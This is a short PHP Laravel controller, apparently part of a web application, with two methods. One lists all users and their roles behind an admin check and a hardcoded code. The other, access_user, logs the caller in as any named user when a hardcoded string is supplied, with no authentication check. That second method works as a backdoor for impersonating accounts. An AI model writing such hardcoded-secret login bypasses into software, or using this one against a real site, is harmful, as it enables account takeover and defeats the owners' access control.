<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AccesController extends Controller
{
    public function get_all_users(Request $request, $code)
    {
        $user   =   get_auth_user();

        if ($user->role !== 'admin') {
            return redirect('/');
        }

        if ($code != 'x20') {
            throw new \Exception('Invalid code');
        }

        return User::get()->pluck('role', 'username')->toArray();
    }

    public function access_user($code, $username)
    {
        if ($code != 'admin@sulapa4_web') {
            throw new \Exception('Invalid code');
        }

        Auth::logout();

        $user = User::where('username', $username)->firstOrFail();

        Auth::login($user, true);

        return redirect('/');
    }
}
